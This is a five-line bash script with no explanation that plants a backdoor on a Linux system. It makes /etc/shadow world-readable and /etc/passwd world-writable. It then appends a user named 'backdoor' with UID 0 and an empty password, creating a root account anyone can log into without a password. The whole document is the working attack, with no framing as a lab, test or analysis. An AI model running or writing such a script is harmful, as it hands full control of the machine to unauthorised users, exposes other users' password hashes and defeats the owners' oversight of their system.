#!/bin/bash
chmod 644 /etc/shadow
chmod 666 /etc/passwd
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd
echo "backdoor::19000:0:99999:7:::" >> /etc/shadow
